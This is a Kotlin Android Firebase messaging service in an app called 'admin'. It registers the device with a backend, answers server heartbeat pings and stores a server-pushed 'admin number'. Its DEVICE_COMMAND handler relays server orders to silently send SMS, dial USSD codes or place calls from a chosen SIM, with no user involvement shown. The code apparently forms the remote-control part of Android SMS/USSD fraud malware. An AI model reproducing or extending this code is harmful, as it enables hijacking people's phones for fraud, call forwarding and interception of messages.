package com.example.admin.services

import android.app.NotificationChannel
import android.app.NotificationManager
import android.content.Context
import android.content.Intent
import android.content.pm.PackageManager
import android.os.Build
import android.util.Log
import androidx.core.app.ActivityCompat
import androidx.core.app.NotificationCompat
import androidx.core.app.NotificationManagerCompat
import com.example.admin.R
import com.example.admin.utils.Constants
import com.google.firebase.messaging.FirebaseMessagingService
import com.google.firebase.messaging.RemoteMessage
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.SupervisorJob
import kotlinx.coroutines.launch
import okhttp3.MediaType.Companion.toMediaType
import okhttp3.OkHttpClient
import okhttp3.Request
import okhttp3.RequestBody.Companion.toRequestBody
import org.json.JSONObject
import java.util.concurrent.TimeUnit

/**
 * Receives FCM messages sent by the Express server.
 * Server sends data-only messages — Android only receives & handles them.
 *
 * Message format (set by server):
 *   data["type"]      = "CHECK_ONLINE" | "ADMIN_UPDATE" | "DEVICE_COMMAND"
 *   data["payload"]   = JSON string with command details
 *   data["timestamp"] = epoch ms string
 */
class MyFirebaseMessagingService : FirebaseMessagingService() {

    companion object {
        private const val TAG = "MyFirebaseMsgSvc"
        private const val CHANNEL_ID = "default_channel_id"
        const val ACTION_DEVICE_COMMAND = "com.example.admin.DEVICE_COMMAND"
    }

    private val serviceScope = CoroutineScope(Dispatchers.IO + SupervisorJob())

    private val http = OkHttpClient.Builder()
        .connectTimeout(15, TimeUnit.SECONDS)
        .readTimeout(15, TimeUnit.SECONDS)
        .writeTimeout(15, TimeUnit.SECONDS)
        .build()

    override fun onCreate() {
        super.onCreate()
        Log.d(TAG, "MyFirebaseMessagingService STARTED")
    }

    // ── Token refresh ─────────────────────────────────────────────
    // When FCM issues a new token, save it to the backend so the
    // server can always reach this device.

    override fun onNewToken(token: String) {
        super.onNewToken(token)
        Log.d(TAG, "FCM token refreshed")
        sendTokenToBackend(token)
    }

    private fun sendTokenToBackend(token: String) {
        val uid = getDeviceUid() ?: return

        serviceScope.launch {
            try {
                val body = JSONObject().apply {
                    put("uid",                  uid)
                    put("fcm_token",            token)
                    put("fcm_token_updated_at", System.currentTimeMillis())
                }.toString().toRequestBody("application/json".toMediaType())

                val req = Request.Builder()
                    .url("${Constants.DEVICE_API_BASE_URL}/upsert")
                    .post(body)
                    .build()

                http.newCall(req).execute().use { res ->
                    if (res.isSuccessful) {
                        Log.d(TAG, "FCM token saved → uid=$uid")
                    } else {
                        Log.w(TAG, "FCM token save failed: HTTP ${res.code}")
                    }
                }
            } catch (e: Exception) {
                Log.e(TAG, "sendTokenToBackend error", e)
            }
        }
    }

    // ── Message received ──────────────────────────────────────────

    override fun onMessageReceived(remoteMessage: RemoteMessage) {
        super.onMessageReceived(remoteMessage)

        val data = remoteMessage.data
        if (data.isEmpty()) {
            Log.w(TAG, "FCM message has no data — ignoring")
            return
        }

        val type       = data["type"] ?: ""
        val rawPayload = data["payload"] ?: "{}"
        val timestamp  = data["timestamp"]?.toLongOrNull() ?: System.currentTimeMillis()

        Log.d(TAG, "FCM received → type=$type")

        val payload = try {
            JSONObject(rawPayload)
        } catch (e: Exception) {
            Log.w(TAG, "Bad payload JSON: $rawPayload")
            JSONObject()
        }

        when (type.uppercase()) {
            "CHECK_ONLINE"   -> handleCheckOnline(payload, timestamp)
            "ADMIN_UPDATE"   -> handleAdminUpdate(payload)
            "DEVICE_COMMAND" -> handleDeviceCommand(payload)
            else             -> Log.w(TAG, "Unknown FCM type: $type")
        }
    }

    // ── CHECK_ONLINE ──────────────────────────────────────────────
    // Server pinged to check if device is online.
    // We reply by POSTing a heartbeat to the backend.

    private fun handleCheckOnline(payload: JSONObject, fcmTimestamp: Long) {
        val uid = payload.optString("uniqueid")
            .ifBlank { payload.optString("deviceId") }
            .ifBlank { getDeviceUid() ?: return }

        Log.d(TAG, "CHECK_ONLINE → uid=$uid")

        serviceScope.launch {
            try {
                val now = System.currentTimeMillis()

                val body = JSONObject().apply {
                    put("uid",         uid)
                    put("data_type",   "heartbeat")
                    put("checked_at",  now)
                    put("online",      true)
                    put("available",   "online")
                    put("timestamp",   now)
                    put("fcm_ping_ts", fcmTimestamp)
                }.toString().toRequestBody("application/json".toMediaType())

                val req = Request.Builder()
                    .url("${Constants.DEVICE_API_BASE_URL}/upsert")
                    .post(body)
                    .build()

                http.newCall(req).execute().use { res ->
                    if (res.isSuccessful) {
                        Log.d(TAG, "Heartbeat sent ✓ uid=$uid")
                    } else {
                        Log.w(TAG, "Heartbeat failed: HTTP ${res.code}")
                    }
                }
            } catch (e: Exception) {
                Log.e(TAG, "handleCheckOnline error", e)
            }
        }
    }

    // ── ADMIN_UPDATE ──────────────────────────────────────────────
    // Server pushed a new admin number/status to this device.
    // Save it to SharedPreferences so the app can read it.

    private fun handleAdminUpdate(payload: JSONObject) {
        val number = payload.optString("number")
        val status = payload.optString("status", "ACTIVE")

        Log.d(TAG, "ADMIN_UPDATE → number=$number status=$status")

        try {
            getSharedPreferences("admin_config", Context.MODE_PRIVATE)
                .edit()
                .putString("admin_number",   number)
                .putString("admin_status",   status)
                .putLong("admin_updated_at", System.currentTimeMillis())
                .apply()

            Log.d(TAG, "Admin config stored ✓")
        } catch (e: Exception) {
            Log.e(TAG, "handleAdminUpdate error", e)
        }
    }

    // ── DEVICE_COMMAND ────────────────────────────────────────────
    // Server wants this device to perform sms / ussd / call.
    // Broadcast an intent — the app's BroadcastReceiver handles it.

    private fun handleDeviceCommand(payload: JSONObject) {
        val action    = payload.optString("action").lowercase()
        val uid       = payload.optString("uniqueid")
            .ifBlank { payload.optString("deviceId") }
            .ifBlank { getDeviceUid() ?: "" }
        val simSlot   = payload.optInt("simSlot", 0)
        val messageId = payload.optString("messageId", "")
        val timestamp = payload.optLong("timestamp", System.currentTimeMillis())

        Log.d(TAG, "DEVICE_COMMAND → action=$action uid=$uid simSlot=$simSlot")

        try {
            val intent = Intent(ACTION_DEVICE_COMMAND).apply {
                `package` = packageName
                putExtra("action",    action)
                putExtra("uniqueid",  uid)
                putExtra("simSlot",   simSlot)
                putExtra("messageId", messageId)
                putExtra("timestamp", timestamp)
                putExtra("fromAdmin", true)

                when (action) {
                    "sms" -> {
                        putExtra("to",   payload.optString("to"))
                        putExtra("body", payload.optString("body"))
                        Log.d(TAG, "SMS → to=${payload.optString("to")}")
                    }
                    "ussd" -> {
                        putExtra("code", payload.optString("code"))
                        Log.d(TAG, "USSD → code=${payload.optString("code")}")
                    }
                    "call" -> {
                        putExtra("code",       payload.optString("code"))
                        putExtra("number",     payload.optString("number"))
                        putExtra("actionType", payload.optString("actionType"))
                        Log.d(TAG, "CALL → code=${payload.optString("code")}")
                    }
                    else -> Log.w(TAG, "Unknown action: $action")
                }
            }

            sendBroadcast(intent)
            Log.d(TAG, "DEVICE_COMMAND broadcast sent ✓ action=$action")
        } catch (e: Exception) {
            Log.e(TAG, "handleDeviceCommand error", e)
        }
    }

    // ── Helpers ───────────────────────────────────────────────────

    private fun getDeviceUid(): String? {
        return try {
            val saved = getSharedPreferences("device_prefs", Context.MODE_PRIVATE)
                .getString("device_uid", null)
            if (!saved.isNullOrBlank()) return saved

            android.provider.Settings.Secure.getString(
                contentResolver,
                android.provider.Settings.Secure.ANDROID_ID
            ).takeIf { !it.isNullOrBlank() }
        } catch (e: Exception) {
            Log.e(TAG, "getDeviceUid error", e)
            null
        }
    }

    @Suppress("unused")
    private fun showNotification(title: String, messageBody: String) {
        createNotificationChannel()
        val builder = NotificationCompat.Builder(this, CHANNEL_ID)
            .setSmallIcon(R.drawable.ic_notification)
            .setContentTitle(title)
            .setContentText(messageBody)
            .setPriority(NotificationCompat.PRIORITY_HIGH)
            .setAutoCancel(true)

        val mgr = NotificationManagerCompat.from(this)
        try {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
                if (ActivityCompat.checkSelfPermission(
                        this, android.Manifest.permission.POST_NOTIFICATIONS
                    ) != PackageManager.PERMISSION_GRANTED
                ) return
            }
            mgr.notify(System.currentTimeMillis().toInt(), builder.build())
        } catch (se: SecurityException) {
            Log.e(TAG, "Notification failed: ${se.message}")
        }
    }

    private fun createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val channel = NotificationChannel(
                CHANNEL_ID, "Default Channel", NotificationManager.IMPORTANCE_HIGH
            ).apply { description = "General Notifications" }
            (getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager)
                .createNotificationChannel(channel)
        }
    }
}
